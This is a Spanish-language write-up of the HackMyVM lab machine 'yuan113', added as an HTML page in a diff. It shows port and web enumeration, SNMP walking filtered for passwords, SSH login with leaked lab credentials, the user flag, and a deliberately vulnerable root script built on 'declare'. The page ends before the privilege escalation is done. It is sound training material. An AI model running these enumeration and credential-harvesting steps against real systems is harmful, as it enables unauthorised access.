@@ -1,0 +1,128 @@
+<!doctype html><html lang=es-ES><head><title>Hackmyvm: yuan113 &ndash; /dev/random</title><meta name=description content="Cultura hacker, software open source y arte hiperdigital"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><link rel=stylesheet href=https://datadiego.github.io/css/palettes/base16-dark.css><link rel=stylesheet href=https://datadiego.github.io/css/risotto.css><link rel=stylesheet href=https://datadiego.github.io/css/custom.css><link rel=stylesheet href=/css/syntax.css><script src=/js/copy-code.js defer></script><script src=/js/fuzzy-search.js defer></script><meta property="og:title" content="Hackmyvm: yuan113 &ndash; /dev/random"><meta property="og:url" content="https://datadiego.github.io/posts/yuan113/"><meta property="og:description" content="Maquina vulnerable yuan113 &ndash; "><meta property="og:locale" content="es-ES"><meta property="og:image" content></head><body><div class=page><header class=page__header><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://datadiego.github.io/ class=page__logo-inner>/dev/random</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/posts/ title>Posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/about/ title>About</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Hackmyvm: yuan113</h1></header><div class=content__body><p>Descargada de <a href=https://downloads.hackmyvm.eu/yuan113.zip>aqui</a>. Debemos encontrar varias flags en la vm.</p><h2 id=reconocimiento>Reconocimiento</h2><p>Tenemos estos puertos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~ ❯ nmap -sV 192.168.0.70
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-04-08 11:31 +0200
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.0.70
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0069s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.62 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 10.86 seconds
+</span></span></code></pre></div><h2 id=reconocimiento-web>Reconocimiento web</h2><p>En <code>index.html</code> no hay nada especial, ni en la propia página ni en su código.</p><p>Usamos <code>fuff</code> para intentar extraer más páginas con <code>fuff -w /usr/share/wordlists/apache.txt -u http://192.168.0.70/FUZZ -v</code></p><pre tabindex=0><code> [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m
+
+ [2K| URL | http://192.168.0.70//.htaccess.bak
+
+ [2K    * FUZZ: /.htaccess.bak
+
+
+ [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m
+
+ [2K| URL | http://192.168.0.70//.htpasswd
+
+ [2K    * FUZZ: /.htpasswd
+
+
+ [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m
+
+ [2K| URL | http://192.168.0.70//.htaccess
+
+ [2K    * FUZZ: /.htaccess
+
+
+ [2K[Status: 200, Size: 796, Words: 268, Lines: 34, Duration: 3ms] [0m
+
+ [2K| URL | http://192.168.0.70//index.html
+
+ [2K    * FUZZ: /index.html
+
+
+ [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 327ms] [0m
+
+ [2K| URL | http://192.168.0.70//server-status
+
+ [2K    * FUZZ: /server-status
+
+
+ [2K[Status: 200, Size: 796, Words: 268, Lines: 34, Duration: 3ms] [0m
+
+ [2K| URL | http://192.168.0.70/index.html
+
+ [2K    * FUZZ: index.html
+</code></pre><p>En la página principal dicen " The quieter you become, the more you are able to hear."</p><p>Intentamos varios escaneos silenciosos, finalmente, con <code>-sU</code> descubrimos un puerto adicional:</p><pre tabindex=0><code>PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+MAC Address: 08:00:27:29:39:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+</code></pre><p>Podemos usar <code>snmpwalk -vc2 -c public &lt;ip></code> para comunicarnos con el o un modulo de metasploit asi:</p><pre tabindex=0><code>msfconsole
+use auxiliary/scanner/snmp/snmp_enum
+set RHOST 192.168.0.66
+run
+</code></pre><p>Podemos filtrar con grep:</p><pre tabindex=0><code> datadiego@debian  yuan113  main  18:02  snmpwalk -v2c -c public 192.168.0.66 | grep -i -E &#34;user|pass|login|ssh|path|home&#34;
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: &#34;The management information definitions for the SNMP User-based Security Model.&#34;
+iso.3.6.1.2.1.25.4.2.1.2.384 = STRING: &#34;systemd-logind&#34;
+iso.3.6.1.2.1.25.4.2.1.2.411 = STRING: &#34;sshd&#34;
+iso.3.6.1.2.1.25.4.2.1.4.377 = STRING: &#34;service --user welcome --password mMOq2WWONQiiY8TinSRF --host localhost --port 8080&#34;
+</code></pre><p>Obtenemos un usuario y contraseña</p><h2 id=entrando-por-openssh>Entrando por OpenSSH</h2><p>Probamos el usuario en el servicio SSH:</p><pre tabindex=0><code> datadiego@debian  ~  18:04  ssh welcome@192.168.0.66
+The authenticity of host &#39;192.168.0.66 (192.168.0.66)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.0.66&#39; (ED25519) to the list of known hosts.
+welcome@192.168.0.66&#39;s password: 
+Linux 113 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan 14 08:32:23 2026 from 192.168.3.94
+welcome@113:~$ whoami
+welcome
+welcome@113:~$ pwd
+/home/welcome
+welcome@113:~$ cat user.txt 
+flag{user-21539141ad1bc8ab9d26420aecb2415b}
+</code></pre><p>Encontramos una flag en el home del usuario que hemos encontrado.</p><h2 id=explorando-la-vm>Explorando la VM</h2><p>No hay nada más en <code>/home/welcome</code></p><p>No hay nada en <code>/tmp</code></p><p>Descargamos linpeas en la maquina con wget y lo ejecutamos.</p><p>Hay algunos archivos interesantes:</p><pre tabindex=0><code>╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
+2026-01-14+08:36:37.6678938600 /usr/bin/mazesec
+2026-01-14+08:35:06.7202883520 /opt/113.sh
+2026-01-14+08:31:54.6147897100 /usr/local/bin/fake-monitoring-service
+2025-04-11+22:22:32.8990844810 /etc/grub.d/10_linux
+2025-04-11+22:07:00.9628442610 /etc/grub.d/40_custom
+</code></pre><p><code>/usr/local/bin/fake-monitoring-service</code> es el archivo del que hemos obtenido las credenciales del usuario <code>welcome</code>.</p><p><code>/opt/113.sh</code> es un script que ejecuta otro script cuando pasamos 3 argumentos, siendo el ultimo obligatoriamente &ldquo;mazesec&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>sandbox</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$sandbox</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> -ne <span class=m>3</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+</span></span><span class=line><span class=cl>        <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$3</span><span class=s2>&#34;</span> !<span class=o>=</span> <span class=s2>&#34;mazesec&#34;</span> <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=k>then</span>
+</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;\$3 must be mazesec&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl>        /bin/cp /usr/bin/mazesec <span class=nv>$sandbox</span>
+</span></span><span class=line><span class=cl>        <span class=nv>exec_</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$sandbox</span><span class=s2>/mazesec&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;exec_&#34;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+</span></span><span class=line><span class=cl>        <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>declare</span> -- <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$exec_</span>
+</span></span></code></pre></div><p>El script ejecutado es el que hay originalmente en <code>/usr/bin/mazesec</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>welcome@113:~$ cat /usr/bin/mazesec
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>flag</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$RANDOM$RANDOM$RAMDOM$RANDOM</span> <span class=p>|</span> md5sum <span class=p>|</span> awk <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;flag{fakeroot-</span><span class=nv>$flag</span><span class=s2>}&#34;</span>
+</span></span></code></pre></div><p>Cuando ejecutamos correctamente <code>113.sh</code> obtenemos una flag falsa, el resultado es el mismo que si ejecutamos directamente <code>mazesec</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>welcome@113:~$ /opt/113.sh a b mazesec
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>fakeroot-7bc233f12d07829b1f5eb3aebc9002ba<span class=o>}</span>
+</span></span><span class=line><span class=cl>welcome@113:~$ /usr/bin/mazesec
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>fakeroot-b38cdd3a2863d9f00bd92598169de36a<span class=o>}</span>
+</span></span><span class=line><span class=cl>welcome@113:~$
+</span></span></code></pre></div></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><span class=about__logo role=img>ᓚᘏᗢ</span>&nbsp;<h1 class=about__title>/dev/random</h1><p class=about__description>Cultura hacker, software open source y arte hiperdigital</p></div><ul class=aside__social-links><li><a href=https://github.com/datadiego rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=juandiegomariscal@gmail.com rel=me aria-label=Email title=Email><i class="fa-solid fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Maquina vulnerable yuan113</p><p>By datadiego,
+2025-07-21</p></div></section><footer class=page__footer><p>Este sitio está disponible en versión <a href=http://rogueo7ciqckck2yhf2dqmqxsrav3ydsobcxkun7f5dmysskcxyfgead.onion/>onion</a></p><p class=copyright>© datadiego</p><script src=https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0,theme:"dark"})</script></footer></div></body></html>
